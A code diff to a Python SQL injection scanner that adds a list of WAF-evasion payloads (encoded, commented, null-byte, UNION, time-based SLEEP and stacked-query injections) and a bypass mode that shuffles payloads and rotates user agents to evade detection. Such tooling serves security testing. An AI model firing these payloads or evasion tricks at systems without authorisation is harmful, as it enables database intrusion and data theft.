@@ -1,4 +1,5 @@
 import logging
+import random
 from urllib.parse import urlparse, parse_qs, quote
 from ..http_client import HttpClient
 import re
@@ -9,7 +10,9 @@ logger = logging.getLogger(__name__)
 class SQLiScanner:
     def __init__(self, client=None):
         self.client = client if client else HttpClient()
-        self.payloads = [
+        
+        # Standard SQL injection payloads
+        self.standard_payloads = [
             "'",
             "' OR '1'='1",
             "' OR 1=1 --",
@@ -24,6 +27,40 @@ class SQLiScanner:
             "1' UNION SELECT NULL,NULL,NULL,NULL--",
             "1' UNION SELECT NULL,NULL,NULL,NULL,NULL--"
         ]
+        
+        # WAF evasion payloads for SQL injection
+        self.waf_evasion_payloads = [
+            # Case variation
+            "' oR '1'='1",
+            "' Or 1=1 --",
+            # Comment and whitespace variations
+            "'/**/OR/**/1=1/**/--",
+            "'%09OR%091=1%09--%09",
+            # Hex encoding
+            "' OR 0x31=0x31 --",
+            # Alternate representations
+            "' OR TRUE --",
+            "' OR 'a'='a' --",
+            # Double encoding
+            "'%252520OR%2525201=1%252520--%252520",
+            # Unicode encoding
+            "'%u0020OR%u00201=1%u0020--%u0020",
+            # Null byte injection
+            "'%00OR%001=1%00--%00",
+            # Obfuscated UNION attacks
+            "1'%20UNION%20SELECT%20NULL,NULL,NULL--",
+            "1'/**/UNION/**/SELECT/**/NULL,NULL--",
+            # Time-based blind with obfuscation
+            "1'%20AND%20(SELECT%201%20FROM%20(SELECT%20SLEEP(1))a)--",
+            # Boolean-based blind with obfuscation
+            "1'%20AND%201=1--",
+            "1'%20AND%201=2--",
+            # Stacked queries with obfuscation
+            "1';%20SELECT%20*%20FROM%20information_schema.tables;--"
+        ]
+        
+        # Use standard payloads by default
+        self.payloads = self.standard_payloads
         self.error_patterns = [
             r"SQL syntax",
             r"MySQL server",
@@ -67,8 +104,19 @@ class SQLiScanner:
             r"SQL Server.*Driver.*Severe.*[0-9]+"
         ]
 
-    def scan(self, url: str, forms: Optional[List[Dict]] = None) -> List[Dict]:
+    def scan(self, url: str, forms: Optional[List[Dict]] = None, waf_bypass: bool = False) -> List[Dict]:
         vulnerabilities = []
+        
+        # Enable WAF bypass mode if requested
+        if waf_bypass and isinstance(self.client, HttpClient):
+            self.client.enable_waf_bypass(True)
+            # Use WAF evasion payloads
+            self.payloads = self.standard_payloads + self.waf_evasion_payloads
+            # Randomize the order to avoid pattern detection
+            random.shuffle(self.payloads)
+        else:
+            # Use standard payloads
+            self.payloads = self.standard_payloads
         
         try:
             # Check URL parameters
@@ -79,8 +127,21 @@ class SQLiScanner:
                 for param in params:
                     for payload in self.payloads:
                         try:
-                            test_url = self._inject_payload(url, param, payload)
-                            response = self.client.get(test_url, timeout=10)
+                            # Apply WAF bypass techniques to payload if enabled
+                            if waf_bypass and isinstance(self.client, HttpClient):
+                                bypass_payload = self.client.apply_payload_bypass(payload, 'sql')
+                            else:
+                                bypass_payload = payload
+                                
+                            test_url = self._inject_payload(url, param, bypass_payload)
+                            
+                            # Add random headers if WAF bypass is enabled
+                            if waf_bypass and isinstance(self.client, HttpClient):
+                                # Set a random user agent for each request
+                                self.client.set_random_user_agent()
+                                response = self.client.get(test_url, timeout=10)
+                            else:
+                                response = self.client.get(test_url, timeout=10)
                             
                             if response and self._is_vulnerable(response.text):
                                 vulnerabilities.append({
@@ -113,11 +174,22 @@ class SQLiScanner:
                         for field in form_fields:
                             for payload in self.payloads:
                                 try:
+                                    # Apply WAF bypass techniques to payload if enabled
+                                    if waf_bypass and isinstance(self.client, HttpClient):
+                                        bypass_payload = self.client.apply_payload_bypass(payload, 'sql')
+                                    else:
+                                        bypass_payload = payload
+                                        
                                     test_data = {}
                                     for f in form_fields:
                                         field_name = f.get('name') if isinstance(f, dict) else f
-                                        test_data[field_name] = payload if f == field else 'test'
+                                        test_data[field_name] = bypass_payload if f == field else 'test'
                                     
+                                    # Add random headers if WAF bypass is enabled
+                                    if waf_bypass and isinstance(self.client, HttpClient):
+                                        # Set a random user agent for each request
+                                        self.client.set_random_user_agent()
+                                        
                                     if method == 'POST':
                                         response = self.client.post(action, data=test_data, timeout=10)
                                     elif method == 'GET':
@@ -144,6 +216,10 @@ class SQLiScanner:
         except Exception as e:
             logger.error(f"SQLi scan error: {str(e)}")
         
+        # Disable WAF bypass mode after scan if it was enabled
+        if waf_bypass and isinstance(self.client, HttpClient):
+            self.client.enable_waf_bypass(False)
+            
         return vulnerabilities
 
     def _inject_payload(self, url: str, param: str, payload: str) -> str:
